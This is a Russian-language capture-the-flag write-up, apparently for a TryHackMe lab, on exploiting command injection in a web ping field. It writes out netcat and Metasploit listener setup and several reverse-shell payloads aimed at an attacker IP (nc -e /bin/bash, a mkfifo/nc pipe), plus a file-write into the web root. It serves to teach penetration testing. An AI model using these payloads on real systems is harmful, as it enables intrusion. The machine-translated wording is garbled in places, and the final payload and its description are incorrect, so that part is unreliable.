## Командная инжекция

Вы можете попробовать несколько разных команд, чтобы получить reverse shell. Я покажу методологию, а затем представлю правильное решение.

### Начало слушателя

Сначала запустите слушатель с netcat (`nc`) так, чтобы вы могли поймать шелл:

```bash
$ sudo nc -lnvp 413
```

Это слушает на порту 413, но вы можете изменить порт на любой нужный — помните, что иногда хорошо известный порт дает больше успеха при попытке получить reverse shell.

Вы также можете использовать обработчик Metasploit:

```bash
$ sudo msfconsole -q
msf6> use exploit/multi/handler

...[set the payload to a generic listener]...

msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp

...[set the host to your attacking machine IP and listening port]...

msf6 exploit(multi/handler) > set lhost 10.10.113.99
lhost => 10.10.113.99
msf6 exploit(multi/handler) > set lport 413
lport => 413

...[start the listener with run or exploit]...

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.113.99:413
```

### Теория командной инжекции

Идея командной инжекции — обмануть сервер, чтобы он выполнил наш код как часть `ping` команды, которая запущена на бэкенде.

Первый шаг обычно заключается в использовании функциональности законно и проверке того, что происходит. Введение IP возвращает вывод, который выглядит так:

![[Pasted image 20211121224601.png]]

Таким образом, вероятно, сервер выполняет команду вроде следующей:

```bash
$ ping -c 4 [USER_INPUT]
```

Существует несколько символов, которые мы можем использовать для связки команд в linux. В теории мы могли бы использовать любой из следующих, и просто нужно тестировать, пока не найдем один, который работает:
- `& [COMMAND]` — запускает нашу команду, если ожидаемая команда завершится выполнением
- `|| [COMMAND]` — запускает нашу команду независимо от завершения ожидаемой команды
- `; [COMMAND]` — запускает нашу команду сразу после ожидаемой команды
- `` `[COMMAND]` `` — запускает нашу команду *первым* (любое, что находится в кавычках, вычисляется и затем выполняется как часть оригинальной команды)

Например, с паллевым пакетом `0.0.0.0; echo "Code Execution!"` наша команда будет выглядеть так, когда сервер её вычисляет:

```bash
$ ping -c 4 0.0.0.0; echo "Code Execution!"
```

### Проверка выполнения кода

Мы можем попробовать ввести следующий в поле ввода, чтобы сразу получить reverse shell:

```
`nc -e /bin/bash 10.10.113.99 413`
```

Это не работает, поэтому давайте попробуем команду `ping`, чтобы проверить, есть ли *Remote Code Execution* через эту командную инжекцию уязвимости.

Мы запускаем команду `tcpdump` для прослушивания пинга (ICMP запроса) на любой интерфейсе, который мы используем для подключения к TryHackMe (если вы используете Attack Box, это `eth0` — если используете OpenVPN, скорее всего `tun0`):

```bash
$ sudo tcpdump -i [INTERFACE] -n icmp
```

Затем мы отправляем паллевый пакет для пинга нашего машины:

```
`ping -c 1 10.10.113.99`127.0.0.1
```

Мы видим, что это работает (немного слишком хорошо — мы получаем много запросов пинга к нашей машины):

![[Pasted image 20211121224508.png]]

Это подтверждает выполнение кода.

### Запись в файл

Мы можем дополнительно проверить выполнение кода, попытавшись записать в файл, доступный для вебсерверa. Большинство серверов на linux по умолчанию хостятся в директории `/var/www/html`, поэтому давайте попробуем записать файл там — если это работает, мы должны смочь его просмотреть в браузере.

Подача этого паллева в поле ввода должна вывести результат команды `which nc` и перенаправить его в файл `hello.html` на сервере:

```
`echo $(which nc) > /var/www/html/hello.html`
```

Как ожидалось, файл содержит вывод команды:

![[Pasted image 20211121224706.png]]

Это подтверждает, что `netcat` установлен на целевой машине. Мы можем попробовать несколько других паллевых шелл пакетов — помните проверить [revshells.com](https://revshells.com), чтобы найти новые.

Этот reverse shell команда часто надежен:

```
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.113.99 413 >/tmp/f`
```

В этом случае мы получаем шелл, но он закрывается сразу:

![[Pasted image 20211121225027.png]]

Другие reverse shell команда не дают ответа. Пришло время изменить стратегию.

### Спектрированный паллевый пакет

Мы будем использовать стратегию записи в файл, чтобы записать в файл и вызвать шелл:

```
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 413`
```

Эта команда создаст файл `/tmp/f`, который будет слушать на порту 413, и вызовет шелл.
